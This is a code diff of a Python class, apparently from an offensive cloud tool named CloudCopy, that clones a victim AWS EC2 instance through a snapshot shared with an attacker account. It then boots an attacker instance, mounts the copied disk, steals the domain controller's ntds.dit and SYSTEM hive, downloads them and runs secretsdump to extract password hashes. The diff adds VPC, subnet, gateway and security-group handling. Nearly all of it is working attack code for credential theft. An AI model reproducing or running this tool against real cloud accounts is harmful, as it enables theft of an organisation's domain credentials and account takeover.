@@ -5,11 +5,14 @@ import uuid
 
 import boto3
 import paramiko
+import requests
 from botocore.exceptions import ClientError
 
 '''
 Util methods for actually CloudCopying
 '''
+
+
 class CloudCopyUtils:
 
     def __init__(self, loginContext):
@@ -19,9 +22,12 @@ class CloudCopyUtils:
         self.victimSnapshot = None  # boto3.Snapshot that is the snapshot made from victim instance
         self.attackingInstance = None  # boto3.Instance object that is the attacking instance holding the snapshot
         self.securityGroup = None  # boto3.SecurityGroup that is the security group for accessing the attacker instance
+        self.vpc = None  # bot3.VPC that is the VPC our cloned instance will live in
+        self.subnet = None  # boto3.Subnet is the subnet inside the VPC where our cloned instance will live
+        self.internetGateway = None  # boto3.InternetGateway is the gateway for the VPC to reach the interwebs
         self.instanceKey = None  # boto3.KeyPair that is the PEM key used for accessing the instance
         self.botoClient = None  # boto3 client for accessing AWS programmatically
-        self.attackMode = 'victim'  # attack mode currently in use, 'victim' for running in victim AWS 'attacker' for ours
+        self.attackMode = 'victim'  # attack mode currently in use 'victim' for running in their AWS 'attacker' for ours
 
     def printGap(self):
         print('---------------------------------------------------------')
@@ -29,6 +35,16 @@ class CloudCopyUtils:
     def cleanup(self):
         self.printGap()
         print("cleaning up any mess we made")
+        if self.internetGateway and not self.vpc.preset:
+            self.internetGateway.load()
+            attachedVpcs = self.internetGateway.attachments
+            for vpc in attachedVpcs:
+                self.internetGateway.detach_from_vpc(VpcId=vpc['VpcId'])
+            self.internetGateway.delete()
+        if self.subnet and not self.vpc.preset:
+            self.subnet.delete()
+        if self.vpc and not self.vpc.preset:
+            self.vpc.delete()
         if self.instanceKey:
             self.instanceKey.delete()
             print("Deleted key " + self.keyName)
@@ -98,8 +114,11 @@ class CloudCopyUtils:
 
         inp = input("which instance are we CloudCopying today? (# or exit to go back) ")
         if inp != 'exit':
-            self.victimInstance = instances[int(inp)]
-            return True
+            try:
+                self.victimInstance = instances[int(inp)]
+                return True
+            except ValueError:
+                return False
         else:
             return False
 
@@ -121,9 +140,11 @@ class CloudCopyUtils:
                     return True
                 except ClientError:
                     print("Snapshot could not be created, sorry")
+                    self.cleanup()
                     return False
             elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                 print("We do not have the Ec2:CreateSnapshot permission. This attack will not succeed. K-Bye.")
+                self.cleanup()
                 return False
 
     # modifies the created snapshot to share it with the attacker owned account
@@ -155,11 +176,25 @@ class CloudCopyUtils:
 
     # creates a security group for the attacker controlled instance so that we can SSH to it. It's open to the world FYI
     def createSecurityGroup(self):
+        ip = requests.get('https://checkip.amazonaws.com').text.strip() + "/32"
+        for securityGroup in list(self.vpc.security_groups.all()):
+            for permission in securityGroup.ip_permissions:
+                for ipRange in permission['IpRanges']:
+                    if ipRange['CidrIp'] == ip or ipRange['CidrIp'] == '0.0.0.0/0':
+                        if permission['IpProtocol'] == '-1' or (['FromPort'] == permission['ToPort'] == '22'):
+                            for egressPerm in securityGroup.ip_permissions_egress:
+                                if egressPerm['IpProtocol'] == '-1' or (
+                                        egressPerm['FromPort'] == egressPerm['ToPort'] == '-1'):
+                                    self.securityGroup = securityGroup
+                                    print("Found usable security group")
+                                    return True
+        print("Couldn't find a suitable security group for exfil so we are making one")
         security_group_name = str(uuid.uuid4())
         try:
             self.botoClient.create_security_group(
                 Description='For connecting to cred stealing instance.',
                 GroupName=security_group_name,
+                VpcId=self.vpc.vpc_id,
                 DryRun=True
             )
         except ClientError as e:
@@ -167,17 +202,99 @@ class CloudCopyUtils:
                 self.securityGroup = self.botoClient.create_security_group(
                     Description='For connecting to cred stealing instance.',
                     GroupName=security_group_name,
+                    VpcId=self.vpc.vpc_id,
                     DryRun=False
                 )
-                self.securityGroup.load()
+                self.securityGroup.load(),
                 self.securityGroup.authorize_ingress(GroupId=self.securityGroup.group_id, IpProtocol="tcp",
-                                                     CidrIp="0.0.0.0/0", FromPort=22, ToPort=22)
+                                                     CidrIp=ip, FromPort=22, ToPort=22)
                 print("Finished creating security group " + security_group_name + " for instance " +
                       self.victimInstance.instance_id)
                 return True
             elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                 print("We do not have the Ec2:CreateSecurityGroup permission. This attack will not succeed. K-Bye.")
+                self.cleanup()
                 return False
+
+    # creates a VPC for the instance to live in
+    def createVPC(self):
+        existingVpc = self.getUseableVPC()
+        if existingVpc:
+            self.vpc = existingVpc
+            self.vpc.preset = True  # custom property to skip next sections
+            self.vpc.load()
+            print("using preexisting VPC, " + self.vpc.vpc_id)
+            return True
+        else:
+            try:
+                self.botoClient.create_vpc(CidrBlock='172.16.0.0/16', DryRun=True)
+            except ClientError as e:
+                if e.response['Error']['Code'] == 'DryRunOperation':
+                    self.vpc = self.botoClient.create_vpc(CidrBlock='172.16.0.0/16', DryRun=False)
+                    self.vpc.load()
+                    self.internetGateway.attach_to_vpc(VpcId=self.vpc.vpc_id)
+                    print("Created new VPC " + self.vpc.vpc_id + " for instance " + self.victimInstance.instance_id)
+                    return True
+                elif e.response['Error']['Code'] == 'VpcLimitExceeded':
+                    print("Too many VPCs")
+                    self.cleanup()
+                    return False
+                else:
+                    print("We could not create the VPC for the instance. This attack will not succeed. K-Bye.")
+                    self.cleanup()
+                    return False
+            except Exception as ex:
+                print(ex)
+                return False
+
+    def getUseableVPC(self):
+        # We try and find a VPC that's usable on the account
+        for vpc in list(self.botoClient.vpcs.all()):
+            if len(list(vpc.subnets.all())) > 0:
+                if len(list(vpc.internet_gateways.all())) > 0:
+                    # if the vpc has all the pieces we need use that
+                    return vpc
+        return None
+
+    def createInternetGateway(self):
+        if self.vpc.preset:
+            print("Using internet gateway of VPC")
+            return True
+        else:
+            try:
+                self.botoClient.create_internet_gateway(DryRun=True)
+            except ClientError as e:
+                if e.response['Error']['Code'] == 'DryRunOperation':
+                    self.internetGateway = self.botoClient.create_internet_gateway(DryRun=False)
+                    print("Created new internet gateway " + self.internetGateway.internet_gateway_id)
+                    return True
+                else:
+                    print("We could not create the internet gateway. This attack will not succeed. K-Bye.")
+                    self.cleanup()
+                    return False
+
+    def createSubnet(self):
+        if len(list(self.vpc.subnets.all())) != 0:
+            # we already have subnets available
+            self.subnet = list(self.vpc.subnets.all())[0]
+            self.subnet.load()
+            print("Using existing subnet: " + self.subnet.subnet_id)
+            return True
+        else:
+            try:
+                self.botoClient.create_subnet(CidrBlock='172.16.0.0/16', VpcId=self.vpc.vpc_id, DryRun=True)
+            except ClientError as e:
+                if e.response['Error']['Code'] == 'DryRunOperation':
+                    self.subnet = self.botoClient.create_subnet(CidrBlock='172.16.0.0/16', VpcId=self.vpc.vpc_id,
+                                                                DryRun=False)
+                    print(
+                        "Created new subnet " + self.subnet.subnet_id + " for instance " + self.victimInstance.instance_id)
+                    return True
+                else:
+                    print(
+                        "We could not create the subnet inside the VPO for the instance. This attack will not succeed. K-Bye.")
+                    self.cleanup()
+                    return False
 
     # create a key pair for use with the attacking instance if one is not set
     def createKeyPair(self):
@@ -196,6 +313,7 @@ class CloudCopyUtils:
                 return True
             elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                 print("We do not have the Ec2:CreateKeyPair permission. This attack will not succeed. K-Bye.")
+                self.cleanup()
                 return False
 
     # creates a new attacker owned EC2 instance that uses the snapshot as an attached disk containing the DC hashes
@@ -230,11 +348,13 @@ class CloudCopyUtils:
                     "SnapshotId": self.victimSnapshot.snapshot_id
                 }
             }],
-            SecurityGroupIds=[
-                self.securityGroup.group_id,
-            ],
-            SecurityGroups=[
-                self.securityGroup.group_name,
+            NetworkInterfaces=[
+                {
+                    'SubnetId': self.subnet.subnet_id,
+                    'DeviceIndex': 0,
+                    'AssociatePublicIpAddress': True,
+                    'Groups': [self.securityGroup.group_id]
+                }
             ],
             ImageId='ami-0c6b1d09930fac512',
             MaxCount=1,
@@ -259,6 +379,10 @@ class CloudCopyUtils:
             except paramiko.ssh_exception.NoValidConnectionsError:
                 print("Can't connect yet, instance may still be warming up. Trying again in 10s")
                 time.sleep(10)
+            except TimeoutError as t:
+                print("Timeout in connection, security rules are borked. Cleaning up")
+                self.cleanup()
+                return None, None
         sftp = connection.open_sftp()
         return connection, sftp
 
@@ -268,39 +392,49 @@ class CloudCopyUtils:
     def stealDCHashFiles(self):
         outfileUid = str(uuid.uuid4())
         connection, sftp = self.connectToInstance()
-        self.printGap()
-        #   have to block on these calls to ensure they happen in order
-        _, stdout, _ = connection.exec_command("sudo mkdir /windows")
-        stdout.channel.recv_exit_status()
-        _, stdout, _ = connection.exec_command("sudo mount /dev/xvdf1 /windows/")
-        stdout.channel.recv_exit_status()
-        _, stdout, _ = connection.exec_command("sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user/ntds.dit")
-        stdout.channel.recv_exit_status()
-        _, stdout, _ = connection.exec_command("sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user/SYSTEM")
-        stdout.channel.recv_exit_status()
-        _, stdout, _ = connection.exec_command("sudo chown ec2-user:ec2-user /home/ec2-user/*")
-        stdout.channel.recv_exit_status()
-        print("finished configuring instance to grab Hash Files")
-        self.printGap()
-        print("Pulling the files...")
-        try:
-            sftp.get("/home/ec2-user/SYSTEM", "./SYSTEM-" + outfileUid)
-            print("SYSTEM registry hive file retrieval complete")
-            sftp.get("/home/ec2-user/ntds.dit", "./ntds.dit-" + outfileUid)
-            print("ntds.dit registry hive file retrieval complete")
-            sftp.close()
-            connection.close()
+        if connection and sftp:
             self.printGap()
-            print("finally gonna run secretsdump!")
-        except Exception as e:
-            print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")
-        try:
-            import subprocess
-            subprocess.run(
-                ["secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds", "./ntds.dit-" + outfileUid, "local",
-                 "-outputfile", "secrets-" + outfileUid])
-        except FileNotFoundError:
-            print("hmm can't seem to find secretsdump on your path. Run this manually against the files.")
+            #   have to block on these calls to ensure they happen in order
+            _, stdout, _ = connection.exec_command("sudo mkdir /windows")
+            stdout.channel.recv_exit_status()
+            _, stdout, _ = connection.exec_command("sudo mount /dev/xvdf1 /windows/")
+            stdout.channel.recv_exit_status()
+            _, stdout, _ = connection.exec_command("sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user/ntds.dit")
+            stdout.channel.recv_exit_status()
+            _, stdout, _ = connection.exec_command(
+                "sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user/SYSTEM")
+            stdout.channel.recv_exit_status()
+            _, stdout, _ = connection.exec_command("sudo chown ec2-user:ec2-user /home/ec2-user/*")
+            stdout.channel.recv_exit_status()
+            print("finished configuring instance to grab Hash Files")
+            self.printGap()
+            print("Pulling the files...")
+            try:
+                sftp.get("/home/ec2-user/SYSTEM", "./SYSTEM-" + outfileUid)
+                print("SYSTEM registry hive file retrieval complete")
+                sftp.get("/home/ec2-user/ntds.dit", "./ntds.dit-" + outfileUid)
+                print("ntds.dit registry hive file retrieval complete")
+                sftp.close()
+                connection.close()
+                self.printGap()
+                print("finally gonna run secretsdump!")
+            except Exception as e:
+                print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")
+            try:
+                import platform
+                import subprocess
+                if platform.system() == "Windows":
+                    subprocess.run(
+                        ["C:\Python27\Scripts\secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds",
+                         "./ntds.dit-" + outfileUid, "local",
+                         "-outputfile", "secrets-" + outfileUid], shell=True)
+                else:
+                    subprocess.run(
+                        ["secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds", "./ntds.dit-" + outfileUid,
+                         "local",
+                         "-outputfile", "secrets-" + outfileUid])
+            except FileNotFoundError:
+                print("hmm can't seem to find secretsdump on your path. Run this manually against the files.")
 
     # Same as above we are just stealing /etc/shadow and /etc/passwd now
     def stealShadowPasswd(self):
